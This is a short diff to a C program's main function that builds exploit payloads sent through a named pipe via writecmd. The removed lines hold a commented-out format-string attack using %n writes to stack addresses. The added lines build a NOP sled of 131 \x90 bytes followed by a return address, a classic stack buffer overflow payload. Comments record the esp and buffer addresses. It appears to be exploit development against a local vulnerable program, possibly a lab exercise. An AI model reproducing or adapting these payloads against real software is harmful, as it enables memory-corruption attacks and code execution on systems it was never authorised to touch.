@@ -7,14 +7,16 @@
 
 int main(void)
 {
-  //char bufr[136];
-  //memcpy(bufr, "AAAdumm\xd8\x57\xbf\xbfzzzz\xd9\x57\xbf\xbfzzzz\xda\x57\xbf\xbfzzzz\xdb\x57\xbf\xbf", 35);
-
-  //strcpy(bufr+35, "%08x%165u%n%253u%n%135u%n%20u%n");
-
-  writecmd(PIPEPATH, "AAAA");
+  char bufr[136];
+  char add[] = "\x01\x20\xa7\xbb";
+  int i;
+  for(i = 0; i < 131; i++)
+    memcpy(bufr + i, "\x90",1);
+  
+  strcpy(bufr + 131, add);
+  writecmd(PIPEPATH, bufr);
   
   return 0;
 }
-// esp: 0xbfbf57d8
+// esp: 0xbfbf57d8 -> 08048be8
 // buf: 0xbfbf57e5
